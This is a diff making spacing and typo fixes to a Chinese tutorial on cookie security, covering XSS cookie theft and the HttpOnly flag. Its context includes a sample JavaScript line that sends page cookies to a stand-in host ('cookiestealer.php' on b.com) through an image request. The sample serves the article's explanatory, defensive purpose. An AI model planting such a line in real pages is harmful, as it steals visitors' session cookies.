@@ -217,14 +217,14 @@ Cookie 以 plain text 在网络上传输，容易受到 packet sniffing 攻击�
 + 敏感网站和系统设置短的 expiration 时间
 + 同时验证HTTP请求的 referrer
 
-尽管请求第三方 JS 资源不会带上前页的 Cookie，但脚本可以访问它们。
+尽管请求第三方 JS 资源不会带上当前页的 Cookie，但脚本可以访问它们。
 
 原因：页面上所有 JavaScript 都被视为运行在与当前网页具有相同域 domain、路径 path 和协议 protocol 上。这意味着来自另一个域的脚本能通过 document.cookie 获取当前页面的 cookie。 
 如： a 网站加载来自 b 网站的 JS，如果脚本里包含如下内容：
 
     (new Image()).src = "http://www.b.com/cookiestealer.php?cookie=" + cookie.domain;
 
-相当于默默地偷取了所有访问 a 网站用户的 cookie。这种将第三方JavaScript注入网页而发生的攻击，称为跨站点脚本（XSS）攻击。
+相当于默默地偷取了所有访问 a 网站用户的 cookie。这种将第三方 JavaScript 注入网页而发生的攻击，称为跨站点脚本（XSS）攻击。
 
 如果一个页面用户输入即输出，即网页输出没有对用户输入做任何过滤，那么当输入文本里通过 `<script></script>` 开闭标记，包含了与上面相同代码，则 cookie 同样可能被盗。
 
@@ -232,8 +232,8 @@ Cookie 以 plain text 在网络上传输，容易受到 packet sniffing 攻击�
 
 ### HTTP-Only cookie
 
-这种类型的Cookie作为一种安全措施，旨在防止通过JavaScript窃取Cookie，造成的跨站点脚本（XSS）攻击。
-服务端通过添加 `HttpOnly` 标识创建HTTP-Only Cookie，格式如下：
+这种类型的 Cookie 作为一种安全措施，旨在防止通过 JavaScript 窃取 Cookie，造成的跨站点脚本（XSS）攻击。
+服务端通过添加 `HttpOnly` 标识创建 HTTP-Only Cookie，格式如下：
 ```
 Set-Cookie: name=Wu; HttpOnly
 ```
@@ -243,7 +243,7 @@ Set-Cookie: name=Wu; HttpOnly
 
 #### 实例
 
-如下图所示：打开谷歌搜索结果页，在浏览器开发者工具-》Application-》Cookies里可以看到，当前页一共有4个cookies，其中3个都设置了HttpOnly。
+如下图所示：打开谷歌搜索结果页，在浏览器开发者工具-》Application-》Cookies里可以看到，当前页一共有4个cookies，其中3个都设置了 HttpOnly。
 
 ![5b759b4edae149dcb18999a68caffab7__20200414163558.png](http://tech.yuceyi.com/upload/5b759b4edae149dcb18999a68caffab7__20200414163558.png) 
 
